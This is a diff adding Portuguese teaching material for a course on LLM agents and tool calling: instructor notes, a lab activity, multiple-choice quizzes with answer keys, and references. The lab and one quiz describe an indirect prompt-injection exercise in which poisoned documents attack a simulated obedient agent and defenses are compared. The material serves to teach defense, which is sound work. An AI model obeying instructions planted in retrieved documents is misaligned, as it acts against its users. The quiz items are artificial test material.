+   "notas": "Revise os erros frequentes do capítulo e pergunte em que seção cada um apareceu. Reforce a conta do exemplo dos erros que se acumulam: com 6 passos em sequência e 95 por cento de acerto por passo, a tarefa inteira dá certo em 0,735 das vezes; com 99 por cento por passo, 0,941. Daí a importância de verificações intermediárias, de menos passos e de medir a tarefa inteira. Reforce as limitações: o ModeloSimulado é baseado em regras, e as taxas de falha e de recuperação foram escolhidas por nós; as tarefas são sintéticas e fáceis; a injeção foi testada contra um modelo cem por cento obediente e contra padrões que nós escrevemos; o sandbox e o log são didáticos; os custos em tokens são um proxy. Pergunta: qual desses erros seria o mais caro em seu contexto? Armadilha: extrapolar os números do simulador."
+  },
+  {
+   "tipo": "pratica",
+   "titulo": "Um agente com guardrails",
+   "passos": [
+    "Registre as ferramentas locais e escreva os esquemas com pydantic; teste argumentos inválidos",
+    "Defina menor privilégio por tipo de tarefa e um confirmador que nega por padrão",
+    "Rode o agente simulado sem falhas e depois com falhas; leia dois traços completos",
+    "Crie 40 tarefas sintéticas verificáveis, 5 delas que não devem executar ação",
+    "Meça sucesso (20 sementes), passos e tokens, com IC bootstrap sobre as tarefas; varie o limite de passos",
+    "Ataque com D61 e D62 e compare as defesas, uma a uma"
+   ],
+   "notas": "Apresente a atividade como a construção de um pequeno laboratório de segurança de agentes para a secretaria fictícia. Os passos seguem o capítulo: registrar ferramentas e testar argumentos inválidos; política de menor privilégio e confirmador que nega por padrão; rodar o agente simulado e ler traços; construir 40 tarefas verificáveis, incluindo 5 que não devem executar ação, para medir se o agente se abstém quando deveria; medir com intervalo de confiança sobre as tarefas; e atacar com os documentos D61 e D62 comparando defesas uma a uma. Há um passo opcional para quem tiver uma chave e um modelo: adaptar o python-ni da seção 14.16, registrando modelo, data e parâmetros. Os Exercícios práticos 14.1 a 14.3 e o Projeto guiam o trabalho. Pergunta: que tarefa sem ação vocês incluiriam? Armadilha: medir só a taxa de sucesso do passo."
+  },
+  {
+   "tipo": "quiz",
+   "titulo": "o que o modelo faz",
+   "pergunta": "Em uma chamada de ferramenta, o que o modelo de linguagem faz?",
+   "opcoes": [
+    "Executa a função diretamente no servidor do provedor, sem passar pela aplicação",
+    "Produz texto estruturado que propõe nome e argumentos; quem executa é o código",
+    "Compila e instala a ferramenta no computador do usuário",
+    "Altera seus próprios pesos para incorporar a função"
+   ],
+   "resposta": "B",
+   "explicacao": "O modelo propõe; o código valida, autoriza, executa e devolve o resultado.",
+   "notas": "Dê um minuto para a turma votar. Se alguém escolher a primeira, volte à analogia do garçom: o cliente não entra na cozinha. Reforce que tudo o que for crítico, como permissão, valor máximo e confirmação, precisa estar no código e não só no prompt. Pergunte que parte da cadeia, validação, autorização, confirmação ou execução, a pessoa colocaria sob responsabilidade do modelo, e por que nenhuma deveria estar."
+  },
+  {
+   "tipo": "quiz",
+   "titulo": "injeção indireta",
+   "pergunta": "Por que as defesas sobre a ação contiveram o dano mesmo com um modelo 100% obediente?",
+   "opcoes": [
+    "Porque convenciam o modelo a ignorar a instrução",
+    "Porque removiam o documento envenenado da base",
+    "Porque atuam no código, depois da decisão do modelo, sem depender de ele reconhecer o ataque",
+    "Porque tornavam o modelo mais inteligente"
+   ],
+   "resposta": "C",
+   "explicacao": "Menor privilégio, domínio permitido e confirmação agem sobre a ação, não sobre o modelo.",
+   "notas": "Esta é a conclusão da tabela de defesas: o sanitizador deixou 40 por cento de ações indevidas, enquanto menor privilégio, domínio permitido e confirmação deram zero. Peça à turma que explique por que a diferença existe. Depois lembre o que não é prometido: mitigação não é eliminação, um atacante ainda pode usar uma ferramenta permitida com destino permitido. Pergunte qual seria o próximo teste a fazer com um modelo real, lembrando que a robustez de modelos reais não foi medida aqui."
+  },
+  {
+   "tipo": "quiz",
+   "titulo": "seis passos em sequência",
+   "pergunta": "Uma tarefa exige 6 passos em sequência, com 95% de acerto independente por passo. A probabilidade de sucesso total é aproximadamente:",
+   "opcoes": [
+    "0,95, a mesma de um passo",
+    "0,57, pois soma-se o erro seis vezes",
+    "0,74, pois 0,95 elevado a 6 fica abaixo de 0,75",
+    "0,99, por compensação entre os passos"
+   ],
+   "resposta": "C",
+   "explicacao": "0,95 elevado a 6 é cerca de 0,735.",
+   "notas": "Deixe a turma calcular no celular ou à mão. O resultado é 0,95 elevado a 6, aproximadamente 0,735, e com 0,99 por passo seria 0,941. Use para reforçar três lições: verificações intermediárias, recuperação de erros e menos passos, pois um roteamento de um passo é mais confiável que um agente de seis; e a necessidade de medir a taxa de sucesso da tarefa inteira e não a do passo. Pergunte aos alunos que erros conceituais levam às respostas de 0,57 e de 0,95."
+  },
+  {
+   "tipo": "sintese",
+   "itens": [
+    "O modelo propõe; o código valida, autoriza, executa e devolve",
+    "Registro: esquema, validação, erros legíveis, idempotência, tempo limite; nunca eval",
+    "Ciclo com paradas; custo de entrada quadrático nos passos",
+    "Fluxos são mais baratos e previsíveis; agentes generalizam com variabilidade e risco",
+    "Segurança em camadas; saída de ferramenta é dado não confiável; mitigar não é eliminar",
+    "Avalie a tarefa inteira, com IC sobre tarefas, e olhe o custo dos erros",
+    "Modelo simulado: os números descrevem o simulador, não LLMs reais"
+   ],
+   "notas": "Faça a síntese pedindo que a turma complete cada frase. Conecte com a pergunta guia: como deixar um modelo usar ferramentas e executar tarefas em várias etapas de modo que o sistema seja útil, controlável, auditável e avaliável, e quando um fluxo fixo é melhor que um agente. Reforce a frase que organiza o capítulo: o modelo decide o que pedir, o código decide o que acontece. Lembre a honestidade dos resultados: o modelo foi simulado, as falhas foram injetadas por nós, a base é fictícia, e o adaptador real com a API é python-ni, não executado. Peça que cada pessoa escreva uma ação que o seu sistema jamais deveria executar sem confirmação humana. Armadilha: sair achando que mais autonomia é sempre melhor."
+  },
+  {
+   "tipo": "referencias",
+   "itens": [
+    "YAO, S. et al. ReAct: synergizing reasoning and acting in language models. ICLR 11, 2023.",
+    "SCHICK, T. et al. Toolformer: language models can teach themselves to use tools. NeurIPS 36, 2023.",
+    "ANTHROPIC. Building effective agents. 19 dez. 2024. Disponível em: https://www.anthropic.com/research/building-effective-agents.",
+    "GRESHAKE, K. et al. Not what you've signed up for: compromising real-world LLM-integrated applications with indirect prompt injection. AISec 16, 2023.",
+    "OWASP FOUNDATION. OWASP top 10 for large language model applications.",
+    "LEWIS, P. et al. Retrieval-augmented generation for knowledge-intensive NLP tasks. NeurIPS 33, 2020.",
+    "EFRON, B.; TIBSHIRANI, R. J. An introduction to the bootstrap. New York: Chapman & Hall, 1993.",
+    "BRASIL. Lei nº 13.709, de 14 de agosto de 2018 (LGPD)."
+   ],
+   "notas": ""
+  }
+ ]
+}
